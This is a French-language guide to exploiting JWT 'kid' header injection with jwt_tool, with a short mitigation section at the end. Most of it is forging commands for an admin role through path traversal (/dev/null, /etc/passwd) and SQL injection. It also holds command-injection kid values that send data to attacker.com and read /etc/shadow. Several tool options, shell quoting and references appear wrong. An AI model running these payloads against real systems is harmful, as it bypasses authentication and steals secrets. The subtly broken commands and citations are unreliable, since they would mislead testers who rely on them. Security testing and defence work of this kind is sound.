---
title: Test d'injection du paramètre Kid JWT avec jwt_tool
description: Guide complet pour exploiter et atténuer les attaques d'injection de l'en-tête kid (Key ID) JWT à l'aide de la boîte à outils de sécurité jwt_tool.
created: 2026-06-22
tags:
  - jwt
  - security
  - vulnerability
  - injection
  - jwt_tool
  - testing
status: draft
---

# Test d'injection du paramètre Kid JWT avec jwt_tool

## Qu'est-ce que l'injection Kid JWT ?

Le `kid` (Key ID) est un paramètre d'en-tête optionnel défini dans la RFC 7515 qui aide le serveur à identifier quelle clé cryptographique doit être utilisée pour vérifier la signature du JWT. Lorsqu'une application récupère dynamiquement la clé de vérification en se basant sur la valeur non nettoyée du `kid` fournie par l'attaquant, cela ouvre la porte à plusieurs attaques critiques :

- **Path Traversal** – L'attaquant définit `kid` sur un chemin de fichier arbitraire (p. ex., `/dev/null`, `../../etc/passwd`). Le serveur lit ce fichier et utilise son contenu brut comme secret HMAC, permettant la forge de signature.
- **SQL Injection** – Si la clé est extraite d'une base de données (p. ex., `SELECT key FROM keys WHERE kid='$kid'`), un attaquant peut injecter du SQL pour retourner une valeur contrôlée.
- **Command Injection / SSRF** – Rare, mais se produit lorsque `kid` est passé non nettoyé dans une commande shell ou une requête HTTP sortante.

## Pourquoi c'est important

Une injection `kid` réussie contourne complètement l'authentification JWT, permettant à un attaquant de :
- Forger des jetons avec des charges utiles arbitraires (p. ex., `"role":"admin"`)
- Élever ses privilèges sans aucun identifiant valide
- Prendre le contrôle de comptes utilisateur ou de panneaux d'administration

Cette vulnérabilité a été responsable de plusieurs CVE et reste un pilier dans les évaluations de sécurité modernes des applications web et les défis CTF.

## Présentation de jwt_tool

`jwt_tool` est une boîte à outils open-source puissante pour auditer, tester et forger des JSON Web Tokens. Elle automatise de nombreuses attaques JWT courantes, notamment la confusion d'algorithme, l'injection `kid`, la falsification de charge utile et le contournement de vérification de signature. Développé par [ticarpi](https://github.com/ticarpi/jwt_tool), il est largement utilisé par les testeurs d'intrusion et les chercheurs en sécurité.

## Installation

### Option 1 : Cloner depuis GitHub (recommandé)

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m pip install -r requirements.txt
```

Rendre l'outil exécutable :

```bash
chmod +x jwt_tool.py
```

### Option 2 : Installer via pip (si disponible)

```bash
pip install jwt-tool
```

> **Note :** La version GitHub est mise à jour plus fréquemment. Toujours tirer la dernière version si vous exécutez depuis la source.

## Utilisation de base

`jwt_tool` peut être invoqué comme un outil en ligne de commande avec un JWT cible. La syntaxe générale est :

```bash
python3 jwt_tool.py <jwt_token> [options]
```

Pour une analyse interactive :

```bash
python3 jwt_tool.py <jwt_token> -t
```

## Exploitation de l'injection Kid avec jwt_tool

### 1. Chemin de traversée via Kid (le plus courant)

L'attaque classique : définir `kid` sur `/dev/null` ou tout fichier connu, et signer le jeton avec une chaîne vide ou le contenu du fichier.

**Étape 1 – Analyser le JWT et identifier le paramètre kid**

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g"
```

Le résultat mettra en évidence les revendications d'en-tête et de charge utile, y compris `kid`.

**Étape 2 – Forger un jeton avec injection kid**

`jwt_tool` fournit l'option `-X i` pour les attaques d'injection `kid`. Utilisez `-I` pour éditer la charge utile et `-pv` pour définir une nouvelle valeur.

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g" \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Explication :**
- `-I` : modifier interactivement les revendications de la charge utile.
- `-pc "role" -pv "admin"` : changer la revendication `role` en `"admin"`.
- `-X i` : effectuer une injection `kid`.
- `-k "/dev/null"` : utiliser `/dev/null` comme fichier de clé. `jwt_tool` signe le jeton en utilisant le contenu de ce fichier (chaîne vide pour `/dev/null`).

L'outil produit un nouveau JWT forgé que le serveur acceptera s'il lit `/dev/null` comme clé de vérification.

**Alternative : Utiliser `/etc/passwd` comme secret**

```bash
python3 jwt_tool.py <original_token> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "../../../etc/passwd"
```

Lorsque le serveur lit `/etc/passwd`, il utilise son contenu entier comme secret HMAC. `jwt_tool` signe automatiquement avec ce contenu.

### 2. Injection SQL via Kid

Si le serveur interroge une base de données pour la clé en utilisant la valeur `kid`, vous pouvez injecter une charge utile SQL pour retourner une valeur connue.

**Exemple :** Créer un jeton avec `kid` défini sur :

```json
{
  "alg": "HS256",
  "kid": " ' UNION SELECT 'known_secret' -- "
}
```

`jwt_tool` n'a pas d'automatisme d'injection SQL intégré, mais vous pouvez créer manuellement l'en-tête puis le signer en utilisant `-X i` avec une clé personnalisée.

**Forge manuelle avec en-tête personnalisé :**

```bash
python3 jwt_tool.py <base_jwt> \
  -X i \
  -k "known_secret" \
  --header '{"alg":"HS256","kid":"' UNION SELECT 'known_secret' -- "}'
```

Ensuite, ajustez la charge utile avec `-I` selon les besoins.

### 3. Injection de commande via Kid

Rare mais possible lorsque `kid` est interpolé dans une commande shell, par exemple :

```
curl https://keyserver.example.com/keys/$(kid)
```

Définir `kid` sur une charge utile d'injection de commande :

```json
"kid": "$(curl -s http://attacker.com/steal?)"
```

`jwt_tool` peut inclure des valeurs d'en-tête arbitraires :

```bash
python3 jwt_tool.py <jwt> \
  --header '{"alg":"RS256","kid":"$(cat /etc/shadow | base64)"}' \
  -X i -k dummy_secret
```

> **Note :** L'exploitation dépend de l'environnement d'exécution du serveur et de la manière dont `kid` est traité.

## Fonctionnalités clés de jwt_tool pour l'injection Kid

| Fonctionnalité | Commande / Option | Description |
|--------------|-------------------|-------------|
| Attaque d'injection Kid | `-X i` | Automatise le processus de définition d'un `kid` forgé et de signature avec un secret basé sur un fichier. |
| Confusion d'algorithme | `-X a` | Combiné avec `-X i` pour des attaques hybrides (passer de RS256 à HS256 après obtention de la clé publique). |
| Falsification de charge utile | `-I` / `-pc` / `-pv` | Modifier interactivement ou non interactivement toute revendication. |
| Fichier de clé personnalisé | `-k <file>` | Spécifier le fichier dont le contenu sera utilisé comme secret HMAC lors de la forge. |
| Analyse de discordance de signature | `-S` / `-s` | Vérifier le comportement du jeton avec des signatures modifiées. |
| Base de données de secrets JWT connus | `-C` | Tenter des secrets faibles courants lors du brute‑force. |
| Manipulation avancée de l'en-tête | `--header` | Insérer du JSON arbitraire dans l'en-tête (utile pour les charges utiles `kid` brutes). |

## Mise en pratique : scénario d'exploitation complet

Considérons une API vulnérable qui utilise JWT pour l'authentification. Le serveur récupère la clé de vérification en lisant le fichier spécifié dans `kid` :

```python
# Vulnérable pseudocode
def verify_token(token):
    header = decode_header(token)
    kid = header['kid']
    with open('/keys/' + kid, 'r') as f:
        secret = f.read()
    return jwt.decode(token, secret, algorithms=['HS256'])
```

**Étape 1 – Reconnaissance**

```bash
python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImNsaWVudCJ9.eyJzdWIiOiJ1c2VyIn0.QPx..."
```

Le résultat montre `alg: RS256`, `kid: client`.

**Étape 2 – Vérifier si le chemin de traversée est possible**

Tenter d'accéder à `/dev/null` :

```bash
python3 jwt_tool.py <token> -X i -k /dev/null
```

Si le serveur renvoie une réponse 200 avec le jeton forgé, la vulnérabilité est confirmée.

**Étape 3 – Élévation de privilèges**

```bash
# Forger un jeton avec le rôle admin
python3 jwt_tool.py <original> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Étape 4 – Utiliser le jeton forgé pour accéder aux ressources protégées**

```bash
curl -H "Authorization: Bearer <forged_token>" https://api.target.com/admin
```

## Stratégies d'atténuation (côté serveur)

1. **Liste blanche des valeurs Kid autorisées** – Coder en dur un mappage des chaînes `kid` connues vers leurs clés publiques correspondantes. Ne jamais dériver la clé de l'entrée utilisateur.
2. **Valider le format Kid** – Si la recherche dynamique est inévitable, imposer des contrôles de format stricts : alphanumériques uniquement, rejeter les séparateurs de chemin (`.` , `/`), rejeter les caractères suspects.
3. **Utiliser des clés codées en dur** – L'approche la plus sûre est d'intégrer la clé publique attendue dans le code de l'application ou un fichier de configuration.
4. **Appliquer le respect de l'algorithme** – Toujours vérifier que l'algorithme utilisé dans le jeton correspond à l'algorithme attendu pour cet émetteur. Ne pas se fier à l'en-tête `alg`.
5. **Utiliser une bibliothèque JWT avec protection intégrée** – Les bibliothèques modernes comme `PyJWT`, `jsonwebtoken` et `jose` peuvent être configurées pour rejeter les valeurs `kid` inconnues ou exiger un ensemble de clés statique.

## Conclusion

`jwt_tool` est un outil indispensable pour tester les vulnérabilités d'injection `kid` JWT. Il automatise les voies d'exploitation les plus courantes et fournit un flux de travail clair et reproductible pour les testeurs de sécurité. Comprendre comment utiliser ses options `-X i` et `-I` peut faire la différence entre une découverte manquée et un contournement d'authentification critique.

Souvenez-vous toujours de traiter `kid` comme **une entrée non fiable** côté serveur. Pour les développeurs, quelques lignes de validation d'entrée peuvent éliminer toute une classe d'attaques JWT.

## Références

- [github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [RFC 7515 – JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- [JWT Attacks (Part 4c): kid Header Injection](https://jwt.io/introduction/)
- [CVE-2018-0114](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114) – node-jsonwebtoken key confusion
- [PortSwigger JWT Kid Lab](https://portswigger.net/web-security/jwt)